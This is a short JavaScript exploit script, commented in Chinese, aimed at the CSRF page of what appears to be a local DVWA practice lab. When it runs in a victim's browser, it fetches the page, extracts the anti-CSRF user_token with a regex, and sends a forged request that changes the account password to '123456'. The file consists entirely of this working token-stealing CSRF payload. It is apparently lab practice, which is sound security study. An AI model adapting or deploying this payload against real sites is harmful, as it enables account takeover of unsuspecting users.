var tokenUrl = 'http://192.168.31.166/temp/dvwa/vulnerabilities/csrf/';
//实例化XMLHttpRequest,用于发送AJAX请求
xmlhttp = new XMLHttpRequest();
var count = 0;
//当请求的状态发生变化时，触发执行代码
xmlhttp.onreadystatechange=function(){
    if(xmlhttp.readyState ==4 && xmlhttp.status==200){
        //取得请求的响应，并从响应中通过正则提取Token
        var text = xmlhttp.responseText;
        var regex = /user_token\' value\=\'(.*?)\' \/\>/;
        var match = text.match(regex);
        //alert(match[1]);
        var token = match[1];
        //发送修改密码的语法
        var changeUrl = 'http://192.168.31.166/temp/dvwa/vulnerabilities/csrf/?user_token='+token+'&password_new=123456&password_conf=123456&Change=Change';
        if(count ==0){
            count=1;//只发送一次，否则会多次发送
            xmlhttp.open("GET",changeUrl,false);
            xmlhttp.send();
        }
    }
};
xmlhttp.open("GET",tokenUrl, false);
xmlhttp.send();